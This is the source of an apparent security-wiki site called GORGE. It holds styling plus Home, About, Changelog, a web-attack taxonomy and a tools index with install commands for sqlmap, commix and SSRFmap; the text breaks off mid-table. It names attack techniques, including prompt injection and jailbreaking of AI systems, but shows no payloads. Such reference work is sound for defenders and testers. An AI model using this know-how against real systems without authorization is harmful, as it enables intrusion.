<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
:root{
--bg:#0d0d0d;--red:#cc0000;--card:#1a1a1a;--border:#252525;--border-hover:#383838;
--text:#cccccc;--text-sec:#888888;--text-muted:#555555;--text-dim:#444444;
--high:#cc5500;--medium:#cc8800;--green:#33cc33;--input-bg:#111111;
}
html,body{background:var(--bg);color:var(--text);font-family:'JetBrains Mono',monospace;font-size:14px;line-height:1.6;overflow-x:hidden;height:100%;}
a{color:var(--red);text-decoration:none;}
a:hover{text-decoration:underline;}
::selection{background:var(--red);color:#fff;}
::-webkit-scrollbar{width:8px;}
::-webkit-scrollbar-track{background:var(--bg);}
::-webkit-scrollbar-thumb{background:var(--border);}
::-webkit-scrollbar-thumb:hover{background:var(--text-muted);}

/* NAVBAR */
#navbar{position:fixed;top:0;left:0;right:0;height:52px;background:var(--bg);border-bottom:1px solid var(--red);display:flex;align-items:center;padding:0 16px;z-index:999;}
.nav-brand{font-size:16px;font-weight:700;color:var(--red);cursor:pointer;letter-spacing:3px;text-transform:uppercase;white-space:nowrap;flex-shrink:0;}
.nav-brand:hover{text-decoration:none;}
#searchWrap{position:relative;flex:1;margin:0 16px;}
#searchInput{background:var(--input-bg);border:1px solid #2a2a2a;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:13px;padding:6px 10px 6px 28px;width:100%;outline:none;border-radius:4px;height:36px;}
#searchInput:focus{border-color:var(--red);}
#searchInput::placeholder{color:#444444;}
.search-icon{position:absolute;left:8px;top:50%;transform:translateY(-50%);color:var(--text-dim);font-size:12px;pointer-events:none;}
#hamburger{display:none;flex-direction:column;gap:4px;cursor:pointer;padding:4px;margin-right:12px;}
#hamburger span{width:18px;height:2px;background:var(--red);}

/* SIDEBAR */
#sidebar{position:fixed;top:52px;left:0;bottom:0;width:300px;background:var(--card);border-right:1px solid #333333;overflow-y:auto;z-index:998;transition:transform 0.2s;}
.sidebar-section-title{font-size:11px;font-weight:600;color:var(--text-dim);text-transform:uppercase;letter-spacing:1px;padding:16px 16px 8px;user-select:none;}
.sidebar-filter-row{display:flex;gap:4px;padding:0 12px 12px;flex-wrap:wrap;}
.filter-btn{background:transparent;border:1px solid #333333;color:#666666;font-family:'JetBrains Mono',monospace;font-size:11px;padding:0 14px;height:28px;cursor:pointer;border-radius:0;text-transform:uppercase;letter-spacing:0.5px;font-weight:500;transition:all 0.1s;}
.filter-btn:hover{border-color:#555555;color:#cccccc;}
.filter-btn.active{background:var(--red);border-color:var(--red);color:#ffffff;}
.filter-btn.active-high{background:var(--high);border-color:var(--high);color:#ffffff;}
.filter-btn.active-medium{background:var(--medium);border-color:var(--medium);color:#ffffff;}
.sidebar-cat-group{border-bottom:1px solid var(--border);}
.sidebar-item{display:flex;align-items:center;gap:6px;padding:8px 12px;cursor:pointer;font-size:12px;user-select:none;transition:background 0.1s;}
.sidebar-item:hover{background:rgba(204,0,0,0.08);}
.sidebar-item.active{background:rgba(204,0,0,0.12);border-left:2px solid var(--red);}
.sidebar-arrow{font-size:8px;color:var(--text-dim);transition:transform 0.15s;display:inline-block;width:12px;text-align:center;}
.sidebar-arrow.expanded{transform:rotate(90deg);}
.sidebar-id{color:var(--text-dim);font-size:10px;min-width:44px;flex-shrink:0;}
.sidebar-name{flex:1;color:var(--text);font-size:11px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:160px;}
.sidebar-badge{font-size:9px;padding:1px 5px;border-radius:2px;font-weight:600;letter-spacing:0.5px;}
.badge-critical{background:var(--red);color:#fff;font-size:9px;padding:1px 5px;border-radius:2px;font-weight:600;letter-spacing:0.5px;}
.badge-high{background:var(--high);color:#fff;font-size:9px;padding:1px 5px;border-radius:2px;font-weight:600;letter-spacing:0.5px;}
.badge-medium{background:var(--medium);color:#fff;font-size:9px;padding:1px 5px;border-radius:2px;font-weight:600;letter-spacing:0.5px;}
.sidebar-sub-items{max-height:0;overflow:hidden;transition:max-height 0.2s ease-out;background:rgba(0,0,0,0.2);}
.sidebar-sub-items.expanded{max-height:500px;}
.sidebar-sub-item{font-size:11px;color:var(--text-muted);padding:4px 12px 4px 36px;cursor:default;border-left:1px solid var(--border);margin-left:12px;}
.sidebar-meta{border-top:1px solid var(--border);margin-top:8px;padding-top:8px;}
.sidebar-meta-item{display:block;font-size:11px;color:var(--text-muted);padding:6px 16px;cursor:pointer;user-select:none;transition:background 0.1s;}
.sidebar-meta-item:hover{background:rgba(204,0,0,0.08);color:var(--text);}
.sidebar-meta-item.active{color:var(--red);border-left:2px solid var(--red);}

/* MAIN CONTENT */
#main-content{margin-left:300px;margin-top:52px;padding:24px 32px 60px;min-height:calc(100vh - 52px);background:var(--bg);}

/* STATS */
.stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:24px;}
.stat-card{background:var(--card);border:1px solid var(--border);padding:16px;text-align:center;}
.stat-number{font-size:28px;font-weight:700;color:#ffffff;}
.stat-label{font-size:11px;color:#666666;text-transform:lowercase;letter-spacing:0.5px;margin-top:6px;}

/* FILTER ROW */
.home-filter-row{display:flex;align-items:center;gap:8px;margin-bottom:20px;flex-wrap:wrap;}
.home-filter-row .filter-btn{font-size:11px;padding:4px 12px;}
.filter-count{font-size:11px;color:var(--text-dim);margin-left:auto;}

/* CATEGORY CARDS */
.category-card{background:var(--card);border:1px solid var(--border);margin-bottom:6px;transition:border-color 0.1s;border-radius:0;}
.category-card:hover{border-color:var(--border-hover);background:#1d1d1d;}
.category-card-header{display:flex;align-items:center;gap:10px;padding:0 14px;height:44px;cursor:pointer;user-select:none;}
.cat-card-id{font-size:10px;color:var(--red);font-weight:600;min-width:52px;letter-spacing:0.5px;}
.cat-card-name{flex:1;font-size:13px;font-weight:400;color:#cccccc;}
.cat-card-types{font-size:11px;color:#555555;margin-left:8px;white-space:nowrap;}
.cat-card-arrow{font-size:9px;color:#555555;transition:transform 0.15s;display:inline-block;padding-left:4px;}
.cat-card-arrow.expanded{transform:rotate(90deg);}
.cat-card-nav{font-size:10px;padding:2px 8px;border:1px solid var(--red);color:var(--red);cursor:pointer;background:transparent;font-family:'JetBrains Mono',monospace;border-radius:0;margin-left:8px;white-space:nowrap;}
.cat-card-nav:hover{background:var(--red);color:#fff;}
.category-card-body{max-height:0;overflow:hidden;transition:max-height 0.25s ease-out;}
.category-card-body.expanded{max-height:600px;}
.cat-subtype-list{list-style:none;padding:8px 16px 12px;}
.cat-subtype-item{font-size:11px;color:var(--text-muted);padding:2px 0;border-left:1px solid var(--border);padding-left:12px;margin-left:4px;}

/* BREADCRUMB */
.breadcrumb{font-size:12px;color:var(--text-dim);margin-bottom:16px;}
.breadcrumb a{color:var(--red);text-decoration:none;}
.breadcrumb a:hover{text-decoration:underline;}

/* PAGE HEADER */
.page-header-id{font-size:32px;font-weight:700;color:var(--text-dim);letter-spacing:2px;}
.page-header-title{font-size:22px;font-weight:600;color:var(--text);margin:4px 0 12px;}
.page-header-badges{display:flex;gap:8px;margin-bottom:24px;}

/* RESEARCH BANNER */
.research-banner{border-left:3px solid var(--red);background:var(--card);padding:12px 16px;margin:20px 0;font-size:12px;color:var(--text-muted);}
.research-banner strong{color:var(--text);}

/* MARKDOWN CONTENT */
.md-content{line-height:1.7;}
.md-content h1{font-size:22px;font-weight:700;color:var(--text);margin:28px 0 12px;padding-bottom:8px;border-bottom:1px solid var(--border);}
.md-content h2{font-size:18px;font-weight:600;color:var(--text);margin:24px 0 10px;}
.md-content h3{font-size:15px;font-weight:600;color:var(--text);margin:20px 0 8px;}
.md-content h4{font-size:13px;font-weight:600;color:var(--text-muted);margin:16px 0 6px;}
.md-content p{margin:8px 0;color:var(--text);}
.md-content ul,
.md-content ol{margin:8px 0 8px 24px;}
.md-content li{margin:3px 0;color:var(--text);}
.md-content hr{border:none;border-top:1px solid var(--border);margin:20px 0;}
.md-content strong{color:#eee;}
.md-content em{color:var(--text-muted);font-style:italic;}
.md-content img{max-width:100%;height:auto;}

/* CODE */
.code-block{background:#0a0a0a;border:1px solid #333;border-left:3px solid var(--red);margin:12px 0;position:relative;}
.code-header{display:flex;justify-content:space-between;align-items:center;padding:6px 12px;background:rgba(255,255,255,0.03);border-bottom:1px solid var(--border);}
.code-lang{font-size:10px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1px;}
.copy-btn{background:transparent;border:1px solid var(--border);color:var(--text-dim);font-family:'JetBrains Mono',monospace;font-size:10px;padding:2px 8px;cursor:pointer;border-radius:4px;}
.copy-btn:hover{border-color:var(--text-muted);color:var(--text-muted);}
.copy-btn.copied{border-color:var(--green);color:var(--green);}
.code-block pre{margin:0;padding:12px;overflow-x:auto;}
.code-block code{font-size:12px;font-family:'JetBrains Mono',monospace;line-height:1.5;}
.inline-code{background:rgba(204,0,0,0.1);color:#e66;padding:1px 5px;font-size:12px;font-family:'JetBrains Mono',monospace;border-radius:2px;}

/* TABLES */
.table-wrap{overflow-x:auto;margin:12px 0;}
.gorge-table{width:100%;border-collapse:collapse;font-size:12px;}
.gorge-table th{background:var(--card);border:1px solid var(--border);padding:8px 12px;text-align:left;font-weight:600;color:var(--text);}
.gorge-table td{border:1px solid var(--border);padding:8px 12px;color:var(--text);}
.gorge-table tr:hover td{background:rgba(204,0,0,0.04);}

/* CALLOUTS */
.gorge-callout{border-left:3px solid var(--red);background:var(--card);padding:12px 16px;margin:12px 0;font-size:13px;color:var(--text-muted);}
.gorge-callout p{margin:4px 0;}

/* COLLAPSIBLE */
.gorge-collapsible{background:var(--card);border:1px solid var(--border);margin:8px 0;}
.gorge-collapsible-trigger{padding:10px 16px;cursor:pointer;font-size:13px;font-weight:500;color:var(--text);user-select:none;}
.gorge-collapsible-trigger:hover{background:rgba(204,0,0,0.05);}
.gorge-collapsible[open] .gorge-collapsible-trigger{border-bottom:1px solid var(--border);}
.gorge-collapsible > :not(summary){padding:12px 16px;}

/* CENTER BLOCK */
.center-block{text-align:center;margin:16px 0;}

/* SEARCH */
.search-header{font-size:16px;font-weight:600;margin-bottom:16px;color:var(--text);}
.search-header mark{background:var(--red);color:#fff;padding:0 3px;}
.search-result-group{margin-bottom:24px;}
.search-result-group-title{font-size:11px;font-weight:600;color:var(--text-dim);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px;padding-bottom:4px;border-bottom:1px solid var(--border);}
.search-result{padding:10px 12px;border:1px solid var(--border);background:var(--card);margin-bottom:4px;cursor:pointer;transition:border-color 0.1s;}
.search-result:hover{border-color:var(--red);}
.search-result-name{font-size:13px;color:var(--text);margin-bottom:2px;}
.search-result-name mark{background:var(--red);color:#fff;padding:0 2px;}
.search-result-path{font-size:11px;color:var(--text-dim);}
.search-result-path mark{background:rgba(204,0,0,0.3);color:var(--text);padding:0 1px;}

/* LAST UPDATED BANNER */
.last-updated{display:flex;align-items:center;gap:8px;font-family:'JetBrains Mono',monospace;font-size:10px;color:#555;padding:8px 0;margin-bottom:16px;border-bottom:1px solid #1a1a1a;}
.last-updated-dot{width:6px;height:6px;border-radius:50%;background:#cc0000;flex-shrink:0;}
.last-updated-label{color:#444;text-transform:uppercase;letter-spacing:0.5px;}
.last-updated-date{color:#888;}
.last-updated-version{color:#444;margin-left:auto;}

/* MERMAID */
.mermaid{background:#111;border:1px solid var(--border);padding:24px;margin:16px 0;text-align:center;overflow-x:auto;max-width:100%;}
.mermaid svg{max-width:100%;height:auto;}

/* TYPE TABLE */
.type-table{width:100%;border-collapse:collapse;font-size:12px;margin:16px 0;}
.type-table th{background:var(--card);border:1px solid var(--border);padding:6px 10px;text-align:left;font-weight:600;color:var(--text-dim);font-size:10px;text-transform:uppercase;letter-spacing:0.5px;}
.type-table td{border:1px solid var(--border);padding:6px 10px;color:var(--text);}
.type-table tr:hover td{background:rgba(204,0,0,0.04);}

/* MOBILE */
@media(max-width:768px){
  #sidebar{transform:translateX(-280px);z-index:1000;}
  #sidebar.open{transform:translateX(0);}
  #main-content{margin-left:0 !important;}
  #hamburger{display:flex;}
  #searchInput{width:140px;}
  .stats-row{grid-template-columns:repeat(2,1fr);}
}
@media(max-width:480px){
  .stats-row{grid-template-columns:1fr 1fr;}
  .category-card-header{flex-wrap:wrap;gap:4px;}
  #searchInput{width:100px;}
}
</style>
</head>

</aside>

<main id="main-content">

</main>

PAGES.home = "## What is GORGE?\n\n**GORGE** is a comprehensive, research-grade application security vulnerability database. Every entry is built from primary sources -- CVEs, academic papers, real-world bug bounty writeups, and original research -- not aggregated summaries.\n\nThis is not a marketing resource. There is no fluff. Every page answers: **what it is, how it works, how to find it, how to exploit it, and how to fix it** -- at every skill level from foundational to elite.\n\n**Designed for three audiences, simultaneously:**\n- **AI Agents** -- machine-readable metadata, structured JSON blocks, consistent taxonomy IDs\n- **Security Researchers** -- full payloads, exploitation chains, real CVE references, tool commands\n- **Learners** -- progressive depth, explained context, lab environments, visual attack flows\n\n---\n\n## Scope\n\n| Domain | Status | Categories | Types | Subtypes |\n|--------|--------|-----------|-------|--------|\n| **Web Application** | Active | 22 | 133 | 665+ |\n| **Mobile Application** | Planned | -- | -- | -- |\n| **API Security** | Partial (under Web) | Included | Included | Included |\n\n---\n\n## Standards & Cross-References\n\n| Standard | Coverage |\n|----------|--------|\n| **OWASP Top 10:2025** | Full mapping |\n| **OWASP WSTG 4.2** | Test case IDs |\n| **CAPEC** | Attack pattern IDs |\n| **CWE** | Weakness IDs per subtype |\n| **CVSS v3.1** | Base scores where applicable |\n| **MITRE ATT&CK** | TTP mappings (where applicable) |\n\n---\n\n## For AI Agents\n\nEvery subtype page contains a machine-readable JSON metadata block:\n\n```json\n{\n  \"id\": \"WEB-CAT01-SQLi-BlindBoolean\",\n  \"category\": \"Injection Attacks\",\n  \"type\": \"SQL Injection\",\n  \"subtype\": \"Boolean-Based Blind SQLi\",\n  \"cwe\": [\"CWE-89\"],\n  \"capec\": [\"CAPEC-7\"],\n  \"cvss_base\": 9.8,\n  \"severity\": \"CRITICAL\",\n  \"owasp_top10_2025\": \"A05\",\n  \"skill_level\": \"intermediate\",\n  \"tags\": [\"sqli\", \"blind\", \"boolean\", \"database\", \"injection\"]\n}\n```\n\nThe Taxonomy page provides the complete enumeration in JSON format for programmatic consumption.\n\n---\n\n## Contributing & Quality Standard\n\nAll content must:\n- Be sourced from primary technical references (no marketing blogs)\n- Include working payloads tested against known-vulnerable environments\n- Reference real CVEs or bug bounty reports where applicable";

PAGES.about = "# About GORGE\n\n---\n\n## What This Is\n\nGORGE is a structured, research-grade vulnerability database focused exclusively on **application security**. It is built for depth, not breadth of surface coverage. Every topic receives focused research before a single page is written.\n\n**Core principles:**\n- One topic at a time. Quality and depth over speed.\n- Primary sources only -- CVEs, academic papers, bug bounty writeups, original PoCs.\n- No marketing content. No \"Top 10 tips\" padding. No AI-generated filler.\n- Every payload is real. Every tool command is tested or sourced from confirmed writeups.\n- All content is verifiable -- every claim has a reference.\n\n---\n\n## Scope\n\n### Phase 1 -- Web Application Security\n22 attack categories covering the full modern web attack surface. Based on cross-referencing:\n- OWASP Top 10:2025\n- OWASP Web Security Testing Guide (WSTG) 4.2\n- CAPEC Mechanisms of Attack taxonomy\n- MITRE CWE database\n- PortSwigger Web Security Research (2019-2025)\n- Real-world bug bounty reports (HackerOne, Bugcrowd disclosures)\n\n### Phase 2 -- Mobile Application Security *(Planned)*\nCovering iOS and Android attack surfaces:\n- OWASP Mobile Top 10\n- MASTG (Mobile Application Security Testing Guide)\n- Runtime manipulation, certificate pinning bypass, IPC attacks\n\n---\n\n## How Pages Are Structured\n\nEvery attack subtype page follows an identical schema:\n\n```\nOverview > Attack Surface > How It Works > Detection & Validation\n> Techniques (Beginner > Advanced) > Tools > Payload Crafting\n> Exploitation > Variations > Real-World Examples\n> Defenses > References > AI Metadata Block\n```\n\n---\n\n## Skill Level Framework\n\n| Level | Description | Who it's for |\n|-------|-------------|-------------|\n| **Foundational** | Core concept, basic detection, standard tool usage | New to the topic |\n| **Intermediate** | WAF bypass, manual exploitation, chaining | Practicing researcher |\n| **Advanced** | Novel techniques, edge cases, protocol-level | Senior researcher |\n| **Elite** | Cutting-edge (2023-2025 research), 0-day patterns | CTF / Red team |\n\n---\n\n## Source Quality Standards\n\n| Type | Standard |\n|------|----------|\n| **Technical Blogs** | Must be from a named researcher, include PoC or technical mechanism |\n| **Writeups** | Must be from an official disclosure or named researcher |\n| **Research Papers** | Peer-reviewed or from a recognized conference (DEF CON, Black Hat, USENIX, CCS, IEEE S&P) |\n| **YouTube** | Must be from a technical channel -- not a beginner tutorial overview |\n| **CVEs** | Must link to NVD entry + at least one technical analysis |\n\nMarketing blogs, vendor \"what is X\" summaries, and uncited claims are never used.\n\n---\n\n## Payload Policy\n\nFull, working payloads are included for all attack subtypes. This database is intended for:\n- Security researchers conducting authorized penetration tests\n- CTF players\n- Developers building secure applications\n- AI agents assisting in security research\n\nUse responsibly. Unauthorized testing is illegal.\n\n---\n\n## Version & Update Policy\n\nSee Changelog for the full update history.\n\nNew attack subtypes are researched and written one at a time. Existing pages are updated when:\n- A new technique variant is published (CVE, PortSwigger research, conference talk)\n- A new tool with significant capability is released\n- An existing payload or technique is demonstrated to be outdated";

PAGES.changelog = "# Changelog\n\n---\n\n## Versioning\n\nFormat: `YYYY-MM-DD | vX.Y | Description`\n\n- **Major (X):** New domain added (e.g., Mobile Phase 2)\n- **Minor (Y):** New attack category or type completed\n- **Patch:** Individual subtype page added or updated\n\n---\n\n## [v0.1.0] -- 2025 -- Initial Release\n\n### Added\n- Full wiki infrastructure: Home, Sidebar, About, Taxonomy, Templates\n- Complete web application attack taxonomy (22 categories, 133 types, 665+ subtypes)\n- CAT-01 Injection Attacks -- category overview and structure\n- All category README skeletons (CAT-01 through CAT-22)\n- Resource pages: Tools Index, Lab Environments, References Master, Methodology\n- AI agent metadata schema v1.0\n- Subtype, Type, and Category page templates\n\n### Taxonomy Sources\n- OWASP Top 10:2025 (confirmed January 2026, 515,000+ applications)\n- OWASP WSTG 4.2\n- CAPEC Mechanisms of Attack (MITRE)\n- CWE Database (MITRE)\n- PortSwigger Web Security Research 2024/2025\n- NIST NVD\n\n---\n\n## Planned\n\n| Version | Content |\n|---------|--------|\n| v0.2.0 | CAT-01 SQLi -- All 6 subtypes (full depth) |\n| v0.3.0 | CAT-01 SSTI -- All 9 template engines |\n| v0.4.0 | CAT-11 HTTP Request Smuggling -- All variants |\n| v0.5.0 | CAT-05 SSRF -- Full coverage + cloud chains |\n| v0.6.0 | CAT-04 JWT Attacks -- Algorithm confusion deep dive |\n| v1.0.0 | CAT-01 through CAT-05 fully complete |\n| v2.0.0 | Mobile Application Phase 2 launch |";

PAGES.taxonomy = "# GORGE Attack Taxonomy\n\n> Machine-readable + human-readable attack taxonomy for Web Application Security.\n> Schema version: 1.0 | Last updated: 2025\n\n---\n\n## Taxonomy Principles\n\nThis taxonomy is built from cross-referencing:\n- **OWASP Top 10:2025** -- risk categories\n- **CAPEC** -- Mechanisms of Attack hierarchy\n- **CWE** -- Weakness classification per attack\n- **OWASP WSTG 4.2** -- test case IDs\n- **Real-world attack intelligence** (PortSwigger Research 2019-2025, bug bounty disclosures)\n\nHierarchy: `Domain > Category > Type > Subtype`\n\n---\n\n## Full Taxonomy: Web Application\n\n<details>\n<summary><b>Expand Full Human-Readable Taxonomy</b></summary>\n\n### CAT-01 -- Injection Attacks -- CRITICAL\n- **SQLi** -- Classic, Union, Error, Boolean Blind, Time Blind, OOB, Second-Order, Stacked, JSON/XML context, ORM\n- **NoSQLi** -- MongoDB operator injection, JS injection, Blind NoSQLi, Firebase\n- **OS Command Injection** -- Classic, Blind, Time-based blind, OOB, Argument injection\n- **SSTI** -- Jinja2, Twig, Freemarker, Velocity, Smarty, Pebble, ERB, Handlebars, Mako\n- **LDAP Injection** -- Filter, Attribute, DN, Blind\n- **XPath Injection** -- Classic, Blind, OOB\n- **EL / OGNL Injection** -- Spring EL, OGNL (Struts), JSP EL, JSF EL, Groovy\n- **XML Injection** -- Tag, CDATA, XSL, Schema injection\n- **HTML Injection** -- Stored, Reflected, DOM-based\n- **CRLF / HTTP Header Injection** -- Response splitting, Log injection, Cookie injection, Redirect\n- **SMTP Injection** -- CC/BCC, Subject, Body, MIME header\n- **Code Injection** -- PHP eval, Python exec, Ruby eval, Node eval, Perl eval\n- **ORM Injection** -- HQL (Hibernate), ActiveRecord, Doctrine DQL, Prisma type confusion\n- **JSON Injection** -- Key injection, Nested object, Array manipulation, NoSQL operator via JSON\n- **Prompt Injection** -- Direct, Indirect, Goal hijacking, Context manipulation, Jailbreaking, Data exfiltration\n\n### CAT-02 -- Broken Access Control -- CRITICAL\n- **IDOR** -- Numeric, Hash/GUID, Indirect, Chained, Blind, HTTP method switch\n- **Path / Directory Traversal** -- Classic, URL-encoded, Double-encoded, UTF-8, Windows, Null byte\n- **Privilege Escalation** -- Horizontal, Vertical, Role parameter, Admin direct access\n- **Forced Browsing** -- Unlinked resource, Predictable URL, Backup file exposure\n- **Missing Function Level Access Control** -- Hidden admin, API endpoint without auth\n- **Parameter Tampering** -- Cookie, Hidden field, URL parameter, JSON body\n- **Mass Assignment** -- Rails, Spring MVC, Django, JavaScript object injection\n- **Open Redirect** -- URL-based, Header-based, JavaScript, Meta refresh\n\n### CAT-03 -- XSS & Client-Side -- HIGH\n- **Reflected XSS** -- Classic, Attribute context, JS context, URL context, CSS context\n- **Stored XSS** -- Comment/forum, Profile field, File upload (SVG/HTML), DOM stored\n- **DOM-Based XSS** -- document.write, innerHTML, window.location, eval(), postMessage\n- **Blind XSS** -- Admin panel, Log viewer, PDF export, Email template\n- **Mutation XSS (mXSS)** -- innerHTML, DOMPurify bypass, HTML parser differential\n- **Universal XSS (UXSS)** -- Browser extension, SOP bypass\n- **CSP Bypass** -- JSONP endpoint, Nonce bypass, Angular/React bypass, Script gadget\n- **Prototype Pollution to XSS** -- Client-side PP, Library gadget chain\n- **Dangling Markup** -- img src, a href, form action\n- **XSSI** -- JSON hijacking, Callback XSSI, Dynamic JS XSSI\n\n### CAT-04 -- Authentication & Session -- CRITICAL\n- **Credential Attacks** -- Brute force, Credential stuffing, Password spraying, Dictionary\n- **Session Hijacking** -- Cookie theft via XSS, Session fixation, Session prediction\n- **JWT Attacks** -- alg:none, RS256>HS256, kid injection, jku/jwks injection, Weak secret\n- **Password Reset Attacks** -- Token predictability, Host header injection, Dangling markup\n- **MFA Bypass** -- TOTP brute force, Response manipulation, Backup code abuse\n- **Authentication Bypass** -- SQL auth bypass, Response manipulation, Type confusion\n- **Account Enumeration** -- Login error, Registration, Password reset, Timing-based\n\n### CAT-05 -- SSRF -- CRITICAL\n- **Basic SSRF** -- Internal IP probing, Localhost access, Cloud metadata (AWS/GCP/Azure)\n- **Blind SSRF** -- DNS-based OOB, HTTP-based, Time-based, Error-differential\n- **SSRF via Protocol Smuggling** -- file://, gopher://, dict://, ftp://, ldap://\n- **SSRF Filter Bypass** -- IP encoding, DNS rebinding, URL shortener, Redirect-based\n- **SSRF to RCE Chains** -- Redis, Memcached, IMDSv1, Internal admin, Kubernetes API\n\n### CAT-06 -- Security Misconfiguration -- HIGH\nDefault credentials, CORS misconfiguration, HTTP security headers, Cloud storage, Debug/error exposure, Directory listing, Sensitive file exposure\n\n### CAT-07 -- Cryptographic Attacks -- HIGH\nPadding oracle, Protocol downgrade, Hash/MAC attacks, Timing attacks, Block cipher mode attacks, JWT cryptographic\n\n### CAT-08 -- Insecure Deserialization -- CRITICAL\nJava, PHP Object Injection, Python, Ruby Marshal, .NET, Node.js, YAML/XML\n\n### CAT-09 -- File & Resource Manipulation -- HIGH\nFile upload attacks, LFI, RFI, XXE (all variants), Archive/path traversal\n\n### CAT-10 -- Business Logic -- HIGH\nPrice/value manipulation, Workflow bypass, Race condition logic, Feature/API misuse, ATO via logic\n\n### CAT-11 -- HTTP Protocol Attacks -- HIGH\nHTTP Request Smuggling, Web Cache Poisoning, Web Cache Deception, HPP, Host Header Injection, HTTP Method abuse\n\n### CAT-12 -- API Security -- CRITICAL\nBOLA, Broken function level auth, Excessive data exposure, Mass assignment via API, Rate limit bypass, Credential leakage, GraphQL attacks\n\n### CAT-13 -- OAuth & Identity -- CRITICAL\nOAuth 2.0 attacks, OIDC attacks, SAML attacks, Account takeover via identity flows\n\n### CAT-14 -- WebSocket Attacks -- MEDIUM\nCSWSH, Message injection, Auth/session attacks, DoS\n\n### CAT-15 -- Prototype Pollution -- HIGH\nClient-side PP, Server-side PP, PP gadget chains, Class pollution\n\n### CAT-16 -- Race Conditions -- HIGH\nTOCTOU, Limit override, Double spend, Parallel request techniques\n\n### CAT-17 -- Information Disclosure -- MEDIUM\nError-based disclosure, Timing side channels, XS-Leaks, Source/config exposure, API spec exposure\n\n### CAT-18 -- Clickjacking & UI Redress -- MEDIUM\nClassic clickjacking, Advanced, UI redress variants\n\n### CAT-19 -- Supply Chain -- HIGH\nDependency attacks, Build system compromise, CDN/third-party script attacks\n\n### CAT-20 -- Application DoS -- MEDIUM\nReDoS, XML/JSON/archive bombs, Application logic DoS, Slow HTTP attacks, CPDoS\n\n### CAT-21 -- CSRF -- MEDIUM\nClassic CSRF, Login CSRF, CSRF token bypass, Same-site gadget chains\n\n### CAT-22 -- Emerging Attacks -- HIGH\nHTTP/2 & HTTP/3 attacks, Subdomain takeover, DNS rebinding, SMTP smuggling, Browser/platform side channels\n\n</details>\n\n---\n\n## Machine-Readable Taxonomy (JSON)\n\n<details>\n<summary><code>taxonomy.json -- Full taxonomy for AI agents</code></summary>\n\n```json\n{\n  \"schema_version\": \"1.0\",\n  \"domain\": \"web_application\",\n  \"total_categories\": 22,\n  \"total_types\": 133,\n  \"total_subtypes\": 665,\n  \"categories\": [\n    {\n      \"id\": \"CAT-01\",\n      \"name\": \"Injection Attacks\",\n      \"severity\": \"CRITICAL\",\n      \"owasp_top10_2025\": \"A05\",\n      \"type_count\": 15\n    },\n    {\n      \"id\": \"CAT-02\",\n      \"name\": \"Broken Access Control\",\n      \"severity\": \"CRITICAL\",\n      \"owasp_top10_2025\": \"A01\",\n      \"type_count\": 8\n    },\n    {\n      \"id\": \"CAT-03\",\n      \"name\": \"XSS & Client-Side Attacks\",\n      \"severity\": \"HIGH\",\n      \"owasp_top10_2025\": \"A05\",\n      \"type_count\": 10\n    }\n  ]\n}\n```\n\n</details>";

PAGES.tools = "# Tools Index\n\n> All offensive security tools referenced in this database, organized by category. Each entry includes install instructions and a key usage command.\n\n---\n\n## Injection\n\n| Tool | Category | Purpose | Install |\n|------|---------|---------|--------|\n| [sqlmap](https://sqlmap.org) | SQLi | Automated SQL injection detection & exploitation | `pip install sqlmap` |\n| [SQLNinja](http://sqlninja.sourceforge.net) | SQLi | MSSQL-focused SQLi exploitation | Package managers |\n| [NoSQLMap](https://github.com/codingo/NoSQLMap) | NoSQLi | Automated NoSQL injection & exploitation | `pip install nosqlmap` |\n| [commix](https://github.com/commixproject/commix) | CMDi | Automated command injection & exploitation | `pip install commix` |\n| [tplmap](https://github.com/epinna/tplmap) | SSTI | Server-side template injection detection | `pip install tplmap` |\n| [SSTImap](https://github.com/vladko312/SSTImap) | SSTI | Modern SSTI scanner (supports more engines) | `pip install sstimap` |\n\n---\n\n## Scanners & Proxies\n\n| Tool | Purpose | Install |\n|------|---------|--------|\n| [Burp Suite Pro](https://portswigger.net/burp) | Full-featured web proxy & scanner | Download from PortSwigger |\n| [OWASP ZAP](https://zaproxy.org) | Open-source web proxy & scanner | `apt install zaproxy` |\n| [Caido](https://caido.io) | Modern web proxy alternative | Download binary |\n| [Nuclei](https://github.com/projectdiscovery/nuclei) | Template-based vulnerability scanner | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |\n\n---\n\n## Reconnaissance\n\n| Tool | Purpose | Install |\n|------|---------|--------|\n| [ffuf](https://github.com/ffuf/ffuf) | Fast web fuzzer | `go install github.com/ffuf/ffuf/v2@latest` |\n| [feroxbuster](https://github.com/epi052/feroxbuster) | Recursive content discovery | `cargo install feroxbuster` |\n| [httpx](https://github.com/projectdiscovery/httpx) | HTTP probing | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` |\n| [gau](https://github.com/lc/gau) | Known URL fetcher | `go install github.com/lc/gau/v2/cmd/gau@latest` |\n| [waybackurls](https://github.com/tomnomnom/waybackurls) | Fetch Wayback Machine URLs | `go install github.com/tomnomnom/waybackurls@latest` |\n\n---\n\n## XSS\n\n| Tool | Purpose | Install |\n|------|---------|--------|\n| [XSStrike](https://github.com/s0md3v/XSStrike) | Advanced XSS scanner | `pip install xsstrike` |\n| [dalfox](https://github.com/hahwul/dalfox) | Parameter analysis & XSS scanner | `go install github.com/hahwul/dalfox/v2@latest` |\n| [kxss](https://github.com/tomnomnom/kxss) | Reflect XSS parameter finder | `go install github.com/tomnomnom/kxss@latest` |\n\n---\n\n## SSRF\n\n| Tool | Purpose | Install |\n|------|---------|--------|\n| [SSRFmap](https://github.com/swisskyrepo/SSRFmap) | SSRF detection & exploitation | `pip install ssrfmap` |\n| [Gopherus](https://github.com/tarunkant/Gopherus) | Generate gopher:// SSRF payloads | `pip install gopherus` |\n| [interactsh](https://github.com/projectdiscovery/interactsh) | OOB interaction server | `go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest` |\n\n---\n\n## Authentication\n\n| Tool | Purpose | Install |\n|------|---------|--------|\n| [jwt_tool](https://github.com/ticarpi/jwt_tool) | JWT testing & exploitation | `pip install jwt_tool` |\n| [hashcat](https://hashcat.net) | Password hash cracking | `apt install hashcat` |\n| [hydra](https://github.com/vanhauser-thc/thc-hydra) | Online brute-forcing | `apt install hydra` |\n\n---\n\n## HTTP Protocol\n\n| Tool | Purpose | Install |\n|------|---------|--------|\n| [smuggler](https://github.com/defparam/smuggler) 